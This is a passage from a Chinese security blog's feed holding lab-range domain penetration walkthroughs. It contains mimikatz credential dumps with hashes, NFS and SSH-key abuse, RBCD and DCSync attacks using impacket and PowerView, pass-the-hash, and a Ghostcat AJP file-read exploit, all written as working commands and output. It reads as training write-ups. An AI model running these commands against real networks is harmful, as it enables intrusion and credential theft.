3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53585 (00000000:0000d151)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d</span><br><span class="line"> * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;`Nfr;;Hf8O&#x27;Szfl0Z=w+^,&gt;0jR</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:01</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><h2 id="NFS挂载"><a href="#NFS挂载" class="headerlink" title="NFS挂载"></a>NFS挂载</h2><p>题目说了nfs</p><p>14那台机器先更新一下依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">apt-get install nfs-common -y</span><br></pre></td></tr></table></figure><p>再挂载nfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd / </span><br><span class="line">mkdir temp </span><br><span class="line">mount -t nfs 172.22.13.57:/ ./temp -o nolock</span><br></pre></td></tr></table></figure><p>发现只有</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078216400-83457089-775c-4b8c-b770-dffbbd34a243.png"></p><p>写公钥连上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">cd /temp/home/joyce/ </span><br><span class="line">mkdir .ssh </span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /temp/home/joyce/.ssh/authorized_keys </span><br><span class="line">ssh -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p>发现没有权限</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078343650-6108ca30-785c-4ba0-bc09-f1eb1e0f0a79.png"></p><p>找找提权，提权探针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078400695-624390fa-f534-4dbf-8122-bd3b69aba365.png"></p><h2 id="ftp提权"><a href="#ftp提权" class="headerlink" title="ftp提权"></a>ftp提权</h2><p>我们能把flag传到ftp里，最初我们获得的机器里那个ftp服务没权限传，我们再起个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup python3 -m pyftpdlib -p 6666 -u test -P test -w &amp;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078675248-8bd23386-da3e-43f3-94eb-24a249483895.png"></p><p>再ssh上57</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 172.22.13.14 6666</span><br><span class="line">put /flag02.txt</span><br></pre></td></tr></table></figure><p>用户名test密码test</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743079004828-70c8e20a-9463-4b35-a186-8a76ff7ba85b.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743079032185-1598bbb7-fb23-41bc-95df-3d9eda5666f9.png"></p><p>再回去看一下,有个pas.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743080134644-d4d62b56-b7cb-447d-b10f-56877395dd72.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab/zhangwen\QT62f3gBhK1</span><br></pre></td></tr></table></figure><p>再回去用bloodhound收集一下域内信息</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743082403028-fd66a712-a9ef-4564-b5d2-9c612d8d6806.png"></p><p>用BloodHound发现chenglei这个用户是ACL Admins组的，对WIN-DC具有WriteDacl权限，能写属性，比如写个DCSync、RBCD啥的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 addcomputer.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -dc-host xiaorang.lab -computer-name &#x27;TEST$&#x27; -computer-pass &#x27;P@ssw0rd&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 rbcd.py xiaorang.lab/chenglei:&#x27;Xt61f3LBhg1&#x27; -dc-ip 172.22.13.6 -action write -delegate-to &#x27;WIN-DC$&#x27; -delegate-from &#x27;TEST$&#x27;</span><br><span class="line"></span><br><span class="line">proxychains python3 getST.py xiaorang.lab/&#x27;TEST$&#x27;:&#x27;P@ssw0rd&#x27; -spn cifs/WIN-DC.xiaorang.lab -impersonate Administrator -dc-ip 172.22.13.6</span><br><span class="line"></span><br><span class="line">export KRB5CCNAME=Administrator@cifs_WIN-DC.xiaorang.lab@XIAORANG.LAB.ccache</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081806411-f966471a-0373-41f2-b488-c787c4dfc143.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081827765-61e7784f-860f-4991-aa10-8ac015fcc046.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743081866826-07d512b0-2e9b-435f-82c8-b0cd111a5901.png"></p><p>然后改&#x2F;etc&#x2F;hosts把dc加进去，即可无密码连上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 psexec.py Administrator@WIN-DC.xiaorang.lab -k -no-pass -dc-ip 172.22.13.6</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\User\Administrator\flag\flag04.txt</span><br></pre></td></tr></table></figure><p>这种方法比较浪费时间，还有一种是直接加dcsync然后导出域控hash</p><p><a href="https://github.com/EmpireProject/Empire/releases/tag/2.5">https://github.com/EmpireProject/Empire/releases/tag/2.5</a></p><p>在这个目录下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743083148854-049e5a83-db29-4648-a378-7091fc037441.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743083129742-1784555e-ecbf-4d73-b758-fde00444dc97.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &#x27;DC=xiaorang,DC=lab&#x27; -PrincipalIdentity chenglei -Rights DCSync -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 secretsdump.py xiaorang.lab/chenglei@172.22.13.6 -hashes :0c00801c30594a1b8eaa889d237c5382 -just-dc-ntlm</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再用猕猴桃</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br></pre></td></tr></table></figure><p>最后打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :6341235defdaed66fb7b682665752c9a Administrator@172.22.13.6</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Spoofing</title>
      <link href="/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/"/>
      <url>/2025/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Spoofing.md/</url>
      
        <content type="html"><![CDATA[<p>先来看一下考点</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952637279-d955c951-bc69-45b3-ace0-f9790b141746.png"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 39.98.116.168</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">39.98.116.168:8080 open</span><br><span class="line">39.98.116.168:22 open</span><br><span class="line">39.98.116.168:8009 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">已完成 3/3</span><br><span class="line">[*] 扫描结束,耗时: 11.0582457s</span><br></pre></td></tr></table></figure><p>发现8080和8009开着，先去看一下8080,发现是个后台</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742952863608-1a0e725e-f006-42fc-94a0-15b87ebb21e9.png"></p><p>再扫一下后台目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">Target: http://39.98.116.168:8080/</span><br><span class="line"></span><br><span class="line">[09:35:33] Starting:</span><br><span class="line">[09:35:33] 302 -    0B  - /js  -&gt;  /js/</span><br><span class="line">[09:35:40] 200 -  114B  - /404.html</span><br><span class="line">[09:35:40] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">[09:35:41] 400 -  795B  - /a%5c.aspx</span><br><span class="line">[09:35:55] 200 -    7KB - /console.html</span><br><span class="line">[09:35:56] 302 -    0B  - /css  -&gt;  /css/</span><br><span class="line">[09:35:56] 302 -    0B  - /data  -&gt;  /data/</span><br><span class="line">[09:35:58] 302 -    0B  - /docs  -&gt;  /docs/</span><br><span class="line">[09:35:58] 404 -  732B  - /docs/CHANGELOG.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/export-demo.xml</span><br><span class="line">[09:35:58] 404 -  729B  - /docs/_build/</span><br><span class="line">[09:35:58] 404 -  731B  - /docs/changelog.txt</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch01s04.html</span><br><span class="line">[09:35:58] 404 -  747B  - /docs/html/admin/index.html</span><br><span class="line">[09:35:58] 404 -  750B  - /docs/html/developer/ch02.html</span><br><span class="line">[09:35:58] 404 -  733B  - /docs/maintenance.txt</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/swagger.json</span><br><span class="line">[09:35:58] 404 -  749B  - /docs/html/admin/ch03s07.html</span><br><span class="line">[09:35:58] 404 -  753B  - /docs/html/developer/ch03s15.html</span><br><span class="line">[09:35:58] 404 -  737B  - /docs/html/index.html</span><br><span class="line">[09:35:58] 200 -   17KB - /docs/</span><br><span class="line">[09:35:58] 404 -  746B  - /docs/html/admin/ch01.html</span><br><span class="line">[09:35:58] 404 -  730B  - /docs/updating.txt</span><br><span class="line">[09:35:58] 200 -  132B  - /download/</span><br><span class="line">[09:35:58] 302 -    0B  - /download  -&gt;  /download/</span><br><span class="line">[09:36:00] 302 -    0B  - /examples  -&gt;  /examples/</span><br><span class="line">[09:36:00] 404 -  781B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/</span><br><span class="line">[09:36:00] 200 -    6KB - /examples/servlets/index.html</span><br><span class="line">[09:36:00] 200 -   14KB - /examples/jsp/index.html</span><br><span class="line">[09:36:00] 200 -  658B  - /examples/servlets/servlet/CookieExample</span><br><span class="line">[09:36:00] 404 -  746B  - /examples/servlet/SnoopServlet</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/websocket/index.xhtml</span><br><span class="line">[09:36:00] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[09:36:01] 200 -  685B  - /examples/jsp/snp/snoop.jsp</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/html</span><br><span class="line">[09:36:03] 403 -    3KB - /host-manager/</span><br><span class="line">[09:36:04] 302 -    0B  - /images  -&gt;  /images/</span><br><span class="line">[09:36:07] 302 -    0B  - /lib  -&gt;  /lib/</span><br><span class="line">[09:36:09] 302 -    0B  - /manager  -&gt;  /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=java.lang:type=Memory&amp;att=HeapMemoryUsage</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?set=BEANNAME&amp;att=MYATTRIBUTE&amp;val=NEWVALUE</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/admin.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/login.asp</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/VERSION</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=BEANNAME&amp;op=METHODNAME&amp;ps=COMMASEPARATEDPARAMETERS</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&amp;op=findConnectors&amp;ps=</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/status/all</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/html</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?qry=STUFF</span><br><span class="line">[09:36:09] 403 -    3KB - /manager/jmxproxy/?get=BEANNAME&amp;att=MYATTRIBUTE&amp;key=MYKEY</span><br><span class="line">[09:36:29] 403 -    0B  - /upload</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/1.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/2.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/loginIxje.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.txt</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.xls</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/b_user.csv</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/upload.php</span><br><span class="line">[09:36:29] 403 -    0B  - /upload/test.php</span><br><span class="line">[09:36:29] 200 -    9KB - /user.html</span><br></pre></td></tr></table></figure><p>版本号泄漏</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742953036071-d879f897-cb48-4c3c-b60b-8f26633c4bd5.png"></p><h2 id="CVE-2020-1983-Tomcat文件包含漏洞"><a href="#CVE-2020-1983-Tomcat文件包含漏洞" class="headerlink" title="CVE-2020-1983 Tomcat文件包含漏洞"></a>CVE-2020-1983 Tomcat文件包含漏洞</h2><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">https://github.com/00theway/Ghostcat-CNVD-2020-10487</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">python3 ajpShooter.py http://39.98.116.168:8080 8009  /WEB-INF/web.xml read</span><br><span class="line"></span><br><span class="line">       _    _         __ _                 _            </span><br><span class="line">      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ </span><br><span class="line">     //_\\ | | &#x27;_ \  \ \| &#x27;_ \ / _ \ / _ \| __/ _ \ &#x27;__|</span><br><span class="line">    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   </span><br><span class="line">    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   </span><br><span class="line">         |__/|_|                                        </span><br><span class="line">                                                00theway,just for test</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">[&lt;] 200 200</span><br><span class="line">[&lt;] Accept-Ranges: bytes</span><br><span class="line">[&lt;] ETag: W/&quot;2489-1670857638305&quot;</span><br><span class="line">[&lt;] Last-Modified: Mon, 12 Dec 2022 15:07:18 GMT</span><br><span class="line">[&lt;] Content-Type: application/xml</span><br><span class="line">[&lt;] Content-Length: 2489</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE web-app PUBLIC</span><br><span class="line"> &quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span><br><span class="line"> &quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot; &gt;</span><br><span class="line"></span><br><span class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;security-constraint&gt;</span><br><span class="line">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line">      &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line">  &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;403&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    